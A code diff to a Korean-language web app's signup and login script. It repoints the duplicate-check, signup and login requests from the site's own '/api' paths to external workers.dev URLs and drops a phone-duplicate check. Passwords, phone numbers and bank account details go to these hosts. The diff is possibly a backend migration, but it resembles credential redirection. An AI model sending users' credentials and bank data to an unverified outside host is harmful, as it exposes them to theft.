@@ -6,7 +6,7 @@ window.DEBUG = true;
   async function isUsernameTaken(username) {
     username = String(username).replace(/[^a-zA-Z0-9]/g, '').toLowerCase().trim();
     if (!username) return false;
-  const res = await fetch('/api/dupcheck', {
+  const res = await fetch('https://dupcheck.hanoiosaka1.workers.dev', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username })
@@ -17,22 +17,7 @@ window.DEBUG = true;
   }
 
   // 서버에서 이메일 중복확인 (임시: 항상 false 반환)
-  
-
-  // 서버에서 전화번호 중복확인
-  async function isPhoneTaken(phone) {
-    phone = String(phone||'').replace(/\D/g,'');
-    if (!phone) return false;
-    const res = await fetch('/api/dupcheck', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone })
-    });
-    if (!res.ok && res.status !== 409) throw new Error('서버 오류');
-    const msg = await res.text();
-    return msg.includes('이미 사용중인 전화번호');
-  }
-async function isEmailTaken(email) {
+  async function isEmailTaken(email) {
     // 실제 서버에 구현되어 있지 않으므로 항상 false 반환
     return false;
   }
@@ -45,7 +30,7 @@ async function isEmailTaken(email) {
     if (!username) throw new Error('아이디를 입력하세요.');
     if (await isUsernameTaken(username)) throw new Error('이미 존재하는 아이디입니다.');
     if (await isEmailTaken(email)) throw new Error('이미 존재하는 이메일입니다.');
-  const res = await fetch('/api/signup', {
+  const res = await fetch('https://signup.hanoiosaka1.workers.dev', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({username, name, birth, phone, email, bank, account, password, status: 'pending', created: new Date().toISOString()})
@@ -59,7 +44,7 @@ async function isEmailTaken(email) {
     if (!id) throw new Error('아이디를 입력하세요.');
     let res;
     try {
-  res = await fetch('/api/login', {
+  res = await fetch('https://login.hanoiosaka1.workers.dev', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: id, password })
@@ -177,7 +162,7 @@ window.GSApp.loginId = async function(id, pw){
   const pwTrimmed = String(pw).trim();
   let res;
   try {
-  res = await fetch('/api/login', {
+  res = await fetch('https://login.hanoiosaka1.workers.dev', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username: filtered, password: pwTrimmed })
